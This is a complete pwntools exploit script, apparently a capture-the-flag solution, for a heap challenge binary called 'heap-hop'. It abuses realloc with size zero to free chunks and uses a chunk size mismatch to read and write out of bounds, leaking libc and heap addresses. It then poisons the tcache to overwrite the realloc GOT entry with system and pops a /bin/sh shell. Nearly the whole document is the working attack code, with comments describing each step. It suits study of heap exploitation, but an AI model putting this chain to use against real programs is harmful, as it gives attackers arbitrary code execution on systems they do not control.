#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("heap-hop_patched")
libc = ELF("./libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
libc_off = 0x219ce0

# Functions
def malloc(track_id: int, name: str, size: int, content: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(track_id).encode())
    io.sendlineafter(b"> ", str(name).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", content)

def read(track_id: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(track_id).encode())
    io.recvuntil(b"[+] track content :\n")
    io.recv(0x70) # 112, remove all \x00 from output
    leak = io.recvuntil(b"Make")
    return leak

def edit(track_id: int, size: int, content: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(track_id).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", content)

# We can actually free a chunk even though the binary does not have it built in.
# The edit function uses realloc, and if we call realloc with size 0 then we can free a chunk
def free(track_id: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(track_id).encode())
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", b"")

io = start()

# Create a small chunk (to be used for tcache poisoning later)
malloc(0, "", 5, b"0")



# Allocate 7 chunks to fill tcache later
for i in range(7):
    malloc(1+i, "", 0x400, str(i).encode())


# Small chunk that will be used for the read and write
malloc(1+8, "", 0x20, b"attacker") # 9 attacker

# Victim chunk from where we will leak libc
malloc(1+9, "", 0x400, b"Victim") # 10 victim

# Barrier chunks to avoid top chunk consolidation
malloc(10+1, "", 0x200, b"Barrier") # 11 barrier
malloc(11+1, "", 0x20, b"Barrier2") # 12 barrier2


for i in range(7):
    free(i+1)


# Free the chunks before and after victim (attacker and barrier)
free(8+1) # 9 attacker
free(11) # Barrier

# Reallocate barrier as attacker. This works because barrier initially had a size of 0x200
# but attacker had 0x20. Since the program did not account for the new size of the chunk we will
# still be able to read 0x200 bytes from barrier, but now it has position of attacker
edit(11, 0x20, b"Barrier attacker")

free(9+1) # 10 victim
leak = read(11) # leak from barrier attacker, leaking 0x200 bytes from a 0x20 chunk that resides just before victim
leak = u64(leak[:8])
log.success("Libc leak: %s" % hex(leak))
libc.address = leak - libc_off
log.success("Libc base: %s" % hex(libc.address))

# Leak heap
edit(1, 0x10, b"HELLO") # Split unsortedbin, meaning that this will be allocated from the unsortedbin chunk start
free(1) # Free the chunk (this chunk is right after the attacker barrier chunk still

leak = read(11)
leak = u64(leak[16:24]) 
log.success("Heap leak: %s" % hex(leak))

heap_base = leak - 0x21d0 # Heap offset i found by running without aslr
log.info("Heap base: %s" % hex(heap_base))

# Tcache poisoning
edit(10, 10, b"svictim") # edit the small victim chunk that we just split from the bigger one

free(0) # free the very first chunk we allocated (the 0x20 sized one)

# tcache 0x20, count = 2, tcache poisoning is basically 10->fp = target
free(10) # free the small victim chunk (the one that holds 'svictim')

# out of bounds write (oob write) from barrier attacker into small victim.
# This is to set smallvictim-fp = &realloc@got-8 (due to alignment issues)
payload = b"A"*32 # 32
payload += p64(0) # 40
payload += p64(0x41) # 48
payload += p64(0)*4 # 80
payload += p64(0x400) # 88
payload += p64(0)*2 # 104
payload += p64(0x21)
payload += p64((heap_base + 0x21f0 >> 12) ^ (elf.got.realloc - 8)) 

edit(11, 0x10, payload) # barrier attacker 11

edit(12, 0x10, b"/bin/sh\0") # 12, barrier2

# Overwrite realloc with system
payload = p64(libc.sym.malloc)
payload += p64(libc.sym.system)
payload += p64(libc.sym.scanf)
edit(4, 0x10, b"Garbage") # Take this chunk out of the tcache
edit(5, 0x10, payload) # allocate system over realloc

# Cannot use malloc, crashes
#malloc(14, "", 0x10, b"gabage") # remove from tcache so next up will be realloc address
#malloc(15, "", 0x10, payload) # overwrite realloc with system


io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"> ", b"12") # use track id 12 as an argument for realloc -> system. id 12 contains "/bin/sh" calling system(/bin/sh)
io.sendlineafter(b"> ", b"10")


io.interactive()
